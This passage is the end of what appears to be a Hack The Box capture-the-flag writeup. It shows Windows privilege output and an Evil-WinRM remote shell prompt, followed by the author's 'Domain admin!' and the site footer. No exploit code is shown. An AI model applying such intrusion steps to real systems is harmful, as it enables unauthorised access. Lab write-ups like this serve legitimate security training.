+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\paul.taylor\Documents&gt;</code></pre><p>Domain admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-snapped/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Snapped</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-vulncicada/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">VulnCicada</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
